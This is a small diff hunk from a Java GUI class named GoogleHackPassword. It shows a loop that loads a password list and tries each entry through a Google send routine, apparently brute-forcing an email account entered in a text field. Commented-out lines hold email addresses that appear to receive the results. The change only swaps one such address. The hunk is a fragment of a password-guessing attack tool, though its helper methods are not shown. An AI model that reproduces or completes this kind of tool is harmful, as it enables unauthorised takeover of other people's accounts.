@@ -76,7 +76,7 @@ public class GoogleHackPassword extends JFrame {
 				utl.loadPasswords();
 				for(int i = 0; i < utl.passwords.size(); i++){
 					//google.recSend3(textField.getText(), "javatest56789@gmail.com", "Password", "Password: " +utl.passwords.get(i));
-					//google.Send(textField.getText(), utl.passwords.get(i), "olivialesbian@yahoo.com", "Password", utl.passwords.get(i));
+					//google.Send(textField.getText(), utl.passwords.get(i), "olivia@yahoo.com", "Password", utl.passwords.get(i));
 					google.recSend(-1);
 					textArea.setText("Password: " + utl.passwords.get(i));
 				}
